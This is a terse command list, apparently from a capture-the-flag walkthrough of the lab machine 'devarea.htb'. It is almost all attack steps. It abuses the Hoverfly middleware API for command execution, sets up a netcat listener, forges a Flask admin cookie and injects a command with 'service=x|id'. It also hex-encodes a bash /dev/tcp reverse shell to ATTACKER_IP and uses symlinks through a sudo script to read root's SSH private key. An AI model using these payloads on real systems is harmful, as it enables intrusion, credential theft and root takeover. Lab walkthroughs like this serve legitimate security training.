# Authenticate to http://devarea.htb:8888/
# PUT /api/v2/hoverfly/middleware
# {"binary":"/bin/bash","script":"id"}

# Reverse-shell listener
nc -lvnp 443

# Local enumeration
sudo -l
getfacl /opt/syswatch
ss -lntup
ps auxww

# Tunnel SysWatch
ssh -L 7777:127.0.0.1:7777 \
  -i PRIVATE_KEY \
  dev_ryan@devarea.htb

# Flask cookie forgery
flask-unsign \
  --sign \
  --cookie '{"user_id":1,"username":"admin"}' \
  --secret 'FLASK_SECRET'

# Command injection
# service=x|id

# Hex payload
echo 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1' \
  | xxd -p -c 0

# Root file read through two-hop symlinks
cd /opt/syswatch/logs
ln -sf redirect flag.log
ln -sf /root/.ssh/id_ed25519 redirect

sudo /opt/syswatch/syswatch.sh logs flag.log \
  > /tmp/root-id_ed25519

# Root SSH
chmod 600 root-id_ed25519
ssh -i root-id_ed25519 root@devarea.htb
```

---

